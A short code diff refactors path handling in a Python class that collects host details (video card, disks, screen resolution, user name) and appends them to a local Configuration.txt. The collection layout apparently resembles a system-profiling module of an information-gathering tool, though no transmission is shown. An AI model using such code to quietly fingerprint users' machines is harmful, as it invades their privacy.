@@ -16,9 +16,7 @@ class System:
     """
     def __init__(self, storage_path: str, folder: str):
 
-        self.__storage_path = storage_path
-        self.__folder = folder
-
+        self.__full_path = path.join(storage_path, folder)
         self.__config = SystemConfig()
 
     def __create_folder(self) -> None:
@@ -26,10 +24,8 @@ class System:
         Creates storage for the System module.
         :return: None
         """
-        storage_path = rf"{self.__storage_path}\{self.__folder}"
-
-        if not path.exists(storage_path):
-            mkdir(storage_path)
+        if not path.exists(self.__full_path):
+            mkdir(self.__full_path)
 
     @staticmethod
     def __get_video_card() -> str:
@@ -157,7 +153,7 @@ class System:
         disk_info = self.__get_disks_info()
         monitors_info = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
 
-        with open(rf"{self.__storage_path}\{self.__folder}\Configuration.txt", "a", encoding="utf-8") as system:
+        with open(path.join(self.__full_path, "Configuration.txt"), "a", encoding="utf-8") as system:
 
             system.write(data.format(
                 self.__config.User,
